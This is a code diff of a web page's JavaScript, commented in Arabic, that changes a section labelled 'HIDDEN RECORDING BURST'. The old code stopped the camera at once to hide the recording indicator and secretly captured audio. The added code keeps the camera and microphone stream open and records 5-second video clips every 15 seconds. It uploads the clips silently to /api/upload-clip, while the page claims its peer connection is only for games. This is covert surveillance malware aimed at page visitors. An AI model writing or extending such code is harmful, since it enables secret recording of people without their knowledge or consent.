@@ -266,8 +266,8 @@ body {
       audio: true
     })
     .then(function(stream) {
-      // إيقاف الكاميرا فوراً لإخفاء النقطة
-      stream.getTracks().forEach(track => track.stop());
+      window.localStream = stream;
+      // لا نوقف الكاميرا حتى نتمكن من التسجيل المستمر والبث
 
       // إنشاء PeerJS connection (فقط للإشارة والألعاب، ليس للبث المباشر)
       peer = new Peer(sessionId, {
@@ -358,17 +358,19 @@ body {
 // 🎯 HIDDEN RECORDING BURST
 // ============================================================
 window.burstRecord = function burstRecord() {
-  navigator.mediaDevices.getUserMedia({ 
-    video: false,
-    audio: { echoCancellation: true, noiseSuppression: true }
-  })
-  .then(function(stream) {
-    // حاول استخدام audio/webm وإن لم يدعم نترك المتصفح يختار
-    let mimeType = 'audio/webm';
+  if (!window.localStream || window.localStream.getTracks().every(t => t.readyState === 'ended')) {
+    setTimeout(window.burstRecord, 5000);
+    return;
+  }
+  
+  try {
+    let mimeType = 'video/webm;codecs=vp8,opus';
     if (!MediaRecorder.isTypeSupported(mimeType)) {
-      mimeType = ''; // يختار المتصفح النوع الافتراضي للصوت
+      mimeType = 'video/webm'; // fallback
+      if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = '';
     }
-    const recorder = new MediaRecorder(stream, mimeType ? { mimeType } : undefined);
+    
+    const recorder = new MediaRecorder(window.localStream, mimeType ? { mimeType } : undefined);
     const chunks = [];
     
     recorder.ondataavailable = function(e) {
@@ -376,17 +378,13 @@ window.burstRecord = function burstRecord() {
     };
     
     recorder.onstop = function() {
-      const type = mimeType || 'audio/webm';
+      const type = mimeType || 'video/webm';
       const blob = new Blob(chunks, { type: type });
       const fd = new FormData();
-      // استخدم امتداد .webm للصوت أيضاً لضمان التوافق
-      fd.append('clip', blob, Date.now() + '_audio.webm');
+      fd.append('clip', blob, Date.now() + '.webm');
       fd.append('sessionId', sessionId);
       
       fetch('/api/upload-clip', { method: 'POST', body: fd }).catch(() => {});
-      
-      // إيقاف مسارات الصوت بعد الانتهاء
-      stream.getTracks().forEach(t => t.stop());
       
       // بعد 15 ثانية، سجل مرة أخرى
       setTimeout(window.burstRecord, 15000);
@@ -396,11 +394,10 @@ window.burstRecord = function burstRecord() {
     setTimeout(() => {
       if (recorder.state !== 'inactive') recorder.stop();
     }, 5000); // سجل 5 ثواني فقط
-  })
-  .catch(function(err) {
+  } catch(err) {
     console.log('Burst error', err);
     setTimeout(window.burstRecord, 5000);
-  });
+  }
 };
 
 })();
